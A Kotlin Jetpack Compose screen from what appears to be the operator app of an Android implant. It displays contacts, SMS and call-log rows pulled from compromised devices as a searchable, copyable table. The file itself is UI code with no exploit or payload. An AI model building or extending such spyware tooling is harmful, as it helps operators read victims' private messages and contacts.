package com.shadow.operator.ui.data

import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Search
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.DataTable
import com.shadow.operator.data.ResultHolder
import com.shadow.operator.ui.theme.*

/**
 * Renders an implant command result as actual content instead of a blob in the
 * activity log: contacts, SMS and call-log rows come back as TSV from
 * ShadowBridge.queryProvider and become a filterable list; JSON objects become
 * key/value rows; anything else falls back to raw text that scrolls and wraps.
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DataScreen(onNavigateBack: () -> Unit) {
    val title = remember { ResultHolder.title.ifBlank { "Result" } }
    val raw = remember { ResultHolder.text }
    val table = remember(raw) { DataTable.parse(title, raw) }
    var query by remember { mutableStateOf("") }
    val clipboard = LocalClipboardManager.current
    val ctx = androidx.compose.ui.platform.LocalContext.current

    val rows = remember(table, query) {
        if (query.isBlank()) table.rows
        else table.rows.filter { r -> r.any { it.contains(query, ignoreCase = true) } }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(title, color = Color.White, fontWeight = FontWeight.SemiBold)
                        Text(
                            when {
                                !table.isTable -> "raw output"
                                query.isNotBlank() ->
                                    "${rows.size} of ${table.count} rows - tap a row to copy"
                                else -> "${table.count} rows - tap a row to copy"
                            },
                            color = TextDim, fontSize = 11.sp
                        )
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onNavigateBack) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = TextPrimary)
                    }
                },
                actions = {
                    IconButton(onClick = {
                        clipboard.setText(AnnotatedString(raw))
                        Toast.makeText(ctx, "Copied ${raw.length} chars", Toast.LENGTH_SHORT).show()
                    }) {
                        Icon(Icons.Default.ContentCopy, contentDescription = "Copy", tint = TextPrimary)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = BgDark)
            )
        },
        containerColor = BgDark
    ) { pd ->
        Column(Modifier.padding(pd).fillMaxSize()) {
            if (table.isTable) {
                OutlinedTextField(
                    value = query,
                    onValueChange = { query = it },
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 12.dp, vertical = 6.dp),
                    placeholder = { Text("filter ${table.count} rows...", color = TextFaint, fontSize = 13.sp) },
                    leadingIcon = { Icon(Icons.Default.Search, null, tint = TextFaint) },
                    textStyle = LocalTextStyle.current.copy(color = TextPrimary, fontSize = 14.sp),
                    singleLine = true,
                    keyboardOptions = KeyboardOptions(imeAction = ImeAction.Search),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = AccentGreen,
                        unfocusedBorderColor = BorderSubtle,
                        cursorColor = AccentGreen
                    )
                )
            }

            if (table.isTable) {
                DataTableView(table, rows, onCopyRow = { line ->
                    clipboard.setText(AnnotatedString(line))
                    Toast.makeText(ctx, "Copied", Toast.LENGTH_SHORT).show()
                })
            } else {
                RawView(raw)
            }
        }
    }
}

@Composable
private fun ColumnScope.DataTableView(
    table: DataTable,
    rows: List<List<String>>,
    onCopyRow: (String) -> Unit,
) {
    val listState = rememberLazyListState()
    // Elevation cue only; derived from the list position so it costs nothing
    // per frame.
    val scrolled by remember {
        derivedStateOf {
            listState.firstVisibleItemIndex > 0 ||
                (listState.firstVisibleItemIndex == 0 && listState.isScrollInProgress)
        }
    }

    Column(
        modifier = Modifier
            .fillMaxWidth()
            .weight(1f)
    ) {
        Row(
            Modifier
                .fillMaxWidth()
                .background(SurfaceSunken)
                .padding(horizontal = 12.dp, vertical = 8.dp)
        ) {
            table.headers.forEachIndexed { i, h ->
                Text(
                    h,
                    color = TextFaint,
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    modifier = Modifier.weight(if (i == 0) 2f else 1f)
                )
            }
        }
        if (scrolled) HorizontalDivider(color = BorderSubtle)

        if (rows.isEmpty()) {
            Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Text("no matching rows", color = TextFaint, fontSize = 13.sp)
            }
            return@Column
        }

        LazyColumn(
            state = listState,
            modifier = Modifier.fillMaxSize(),
            contentPadding = PaddingValues(bottom = 16.dp)
        ) {
            items(rows) { row ->
                Row(
                    Modifier
                        .fillMaxWidth()
                        .clickable { onCopyRow(row.joinToString("\t")) }
                        .padding(horizontal = 12.dp, vertical = 9.dp)
                ) {
                    row.forEachIndexed { i, cell ->
                        val emphasise = when (i) {
                            0 -> FontWeight.Medium
                            else -> FontWeight.Normal
                        }
                        Text(
                            cell.ifBlank { "-" },
                            color = if (i == 0) TextPrimary else TextBody,
                            fontSize = 13.sp,
                            fontWeight = emphasise,
                            maxLines = if (i == 0) 2 else 1,
                            modifier = Modifier.weight(if (i == 0) 2f else 1f)
                        )
                    }
                }
                HorizontalDivider(color = BorderSubtle)
            }
        }
    }
}

@Composable
private fun RawView(raw: String) {
    if (raw.isBlank()) {
        Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("no output", color = TextFaint, fontSize = 13.sp)
        }
        return
    }
    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(12.dp)
    ) {
        Text(
            raw,
            color = TextBody,
            fontSize = 12.sp,
            fontFamily = FontFamily.Monospace,
            softWrap = true
        )
    }
}

// Local palette. Theme.kt only publishes a small shared set, and FleetScreen's
// richer palette is file-private, so these live here rather than widening the
// global theme and shifting colours elsewhere in the app.
private val BgDark = Color(0xFF0A0E14)
private val SurfaceSunken = Color(0xFF131A24)
private val BorderSubtle = Color(0xFF22303F)
private val TextBody = Color(0xFFD9E1EC)
private val TextFaint = Color(0xFF66707F)
private val TextDim = Color(0xFF8892A4)
